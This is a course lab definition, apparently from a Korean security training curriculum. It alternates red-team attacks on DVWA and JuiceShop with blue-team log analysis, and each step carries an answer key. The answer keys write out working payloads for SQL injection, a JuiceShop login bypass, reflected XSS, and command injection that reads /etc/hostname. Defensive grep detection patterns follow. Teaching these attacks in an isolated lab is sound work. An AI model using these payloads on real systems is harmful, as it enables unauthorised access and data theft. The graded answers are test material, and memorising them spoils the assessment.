lab_id: battle-nonai-week03
title: 웹 애플리케이션 공격 — SQL Injection, XSS, 인증 우회
version: non-ai
course: battle-nonai
week: 3
description: 1세트 인프라에서 Red/Blue 역할을 번갈아 수행한다. Red Phase에서 DVWA와 JuiceShop 대상 OWASP Top 10 공격을 수행하고, Blue Phase에서 공격 로그를 분석하고 탐지 규칙을 확인한다.
difficulty: medium
duration_minutes: 120
objectives:
- SQL Injection의 원리를 이해하고 수동으로 공격을 수행한다
- XSS와 인증 우회 공격을 실습한다
- Blue 관점에서 웹 공격을 탐지하고 분석한다
prerequisites:
- HTTP 프로토콜 기초
- SQL 기본 문법
infra_requirements:
- attacker VM (10.20.30.201)
- secu VM (10.20.30.1) — nftables, suricata
- web VM (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem VM (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[RED] DVWA 웹 애플리케이션(8080)에 접속하여 로그인하라. (admin/password)'
  hint: curl로 로그인 요청을 보낸다.
  category: exploit
  points: 5
  answer: "curl -c /tmp/dvwa_cookies.txt \\\n     -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php"
  answer_detail: DVWA의 기본 계정은 admin/password이다. curl -c 옵션으로 쿠키를 파일에 저장하면 이후 인증된 상태로 요청을 보낼 수 있다.
  verify:
    type: file_exists
    expect: /tmp/dvwa_cookies.txt
    field: filesystem
  target_vm: attacker
- order: 2
  instruction: '[RED] DVWA SQL Injection 페이지에서 '' OR ''1''=''1 입력으로 모든 사용자 정보를 추출하라.'
  hint: User ID 필드에 SQL 구문을 삽입한다.
  category: exploit
  points: 10
  answer: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit"
  answer_detail: SQL Injection은 사용자 입력이 SQL 쿼리에 직접 삽입될 때 발생한다. ' OR '1'='1 구문은 WHERE 조건을 항상 참으로 만들어 모든 레코드를 반환하게 한다.
  verify:
    type: output_contains
    expect: First name
    field: stdout
  target_vm: attacker
- order: 3
  instruction: '[RED] UNION SELECT를 사용하여 DVWA 데이터베이스의 테이블 이름을 추출하라.'
  hint: information_schema.tables를 활용한다.
  category: exploit
  points: 10
  answer: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2Cgroup_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()--+&Submit=Submit"
  answer_detail: information_schema는 MySQL 메타데이터를 저장하는 시스템 데이터베이스이다. group_concat()으로 여러 행을 하나의 문자열로 합쳐 추출한다.
  verify:
    type: output_contains
    expect: users
    field: stdout
  target_vm: attacker
- order: 4
  instruction: '[RED] JuiceShop(:3000)에 SQL Injection으로 관리자 인증을 우회하라.'
  hint: login API에 SQL Injection 페이로드를 전송한다.
  category: exploit
  points: 15
  answer: "curl -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"email\":\"' or 1=1--\",\"password\":\"x\"}'"
  answer_detail: JuiceShop의 로그인 API는 email 필드에 SQL Injection이 가능하다. ' or 1=1-- 페이로드로 인증을 우회하면 관리자 토큰을 획득한다.
  verify:
    type: output_contains
    expect: token
    field: stdout
  target_vm: attacker
- order: 5
  instruction: '[RED] DVWA Reflected XSS 페이지에서 스크립트 태그를 삽입하라.'
  hint: <script> 태그를 URL 인코딩하여 전송한다.
  category: exploit
  points: 10
  answer: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"
  answer_detail: Reflected XSS는 사용자 입력이 서버 응답에 그대로 반영될 때 발생한다. <script>alert('XSS')</script>가 HTML에 삽입되어 브라우저에서 실행된다.
  verify:
    type: output_contains
    expect: <script>
    field: stdout
  target_vm: attacker
- order: 6
  instruction: '[BLUE] Suricata에서 SQL Injection 관련 알림을 확인하라.'
  hint: eve.json에서 SQL Injection 시그니처를 검색한다.
  category: defense
  points: 10
  answer: tail -100 /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | "\(.timestamp) \(.alert.signature) from \(.src_ip)"' 2>/dev/null | grep -i sql | tail -5
  answer_detail: Suricata의 ET Open 룰셋에는 SQL Injection 탐지 시그니처가 포함되어 있다. UNION SELECT, OR 1=1 등의 패턴이 탐지된다.
  verify:
    type: output_contains
    expect: 10.20.30
    field: stdout
  target_vm: secu
- order: 7
  instruction: '[BLUE] web 서버의 Apache access.log에서 SQL Injection 시도를 분석하라.'
  hint: UNION, SELECT, OR 1=1 등의 패턴을 검색한다.
  category: defense
  points: 10
  answer: grep -iE '(union|select|or%201%3D1|%27)' /var/log/apache2/access.log 2>/dev/null | tail -10
  answer_detail: Apache access.log에서 URL 인코딩된 SQL 키워드를 검색하면 SQL Injection 시도를 발견할 수 있다. 공격 시각, 소스 IP, 대상 URL을 확인한다.
  verify:
    type: output_contains
    expect: union
    field: stdout
  target_vm: web
- order: 8
  instruction: '[BLUE] ModSecurity 감사 로그에서 차단된 웹 공격을 확인하라.'
  hint: modsec_audit.log를 분석한다.
  category: defense
  points: 10
  answer: sudo tail -50 /var/log/apache2/modsec_audit.log 2>/dev/null | grep -E '(SQL|XSS|Injection|id "9)' | tail -10 || echo 'ModSecurity log check complete'
  answer_detail: ModSecurity는 OWASP CRS 규칙으로 SQL Injection, XSS 등을 탐지/차단한다. 감사 로그에서 차단된 요청의 상세 정보를 확인할 수 있다.
  verify:
    type: output_contains
    expect: complete
    field: stdout
  target_vm: web
- order: 9
  instruction: '[RED] DVWA Command Injection 취약점을 이용하여 서버의 /etc/hostname 파일을 읽어라.'
  hint: 세미콜론(;)으로 명령을 연결한다.
  category: exploit
  points: 10
  answer: "curl -b /tmp/dvwa_cookies.txt \\\n     -d 'ip=127.0.0.1;cat+/etc/hostname&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/"
  answer_detail: Command Injection은 사용자 입력이 시스템 명령에 직접 삽입될 때 발생한다. 세미콜론(;)은 리눅스에서 명령 구분자로, 원래 명령(ping) 뒤에 임의 명령(cat)을 추가 실행한다.
  verify:
    type: output_contains
    expect: 127.0.0.1
    field: stdout
  target_vm: attacker
- order: 10
  instruction: '[BLUE] Wazuh SIEM에서 웹 공격 관련 종합 알림을 확인하라.'
  hint: wazuh alerts 로그를 확인한다.
  category: defense
  points: 15
  answer: 'sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -30 | jq -r ''select(.rule.level >= 5) | "Level \(.rule.level): \(.rule.description)"'' 2>/dev/null | tail -10 || echo ''Wazuh alert
    review complete'''
  answer_detail: Wazuh는 Apache 로그를 분석하여 웹 공격을 탐지한다. rule.level 5 이상은 주의가 필요한 이벤트이다. Suricata + Wazuh를 병행하면 네트워크와 호스트 관점의 탐지가 가능하다.
  verify:
    type: output_contains
    expect: complete
    field: stdout
  target_vm: siem
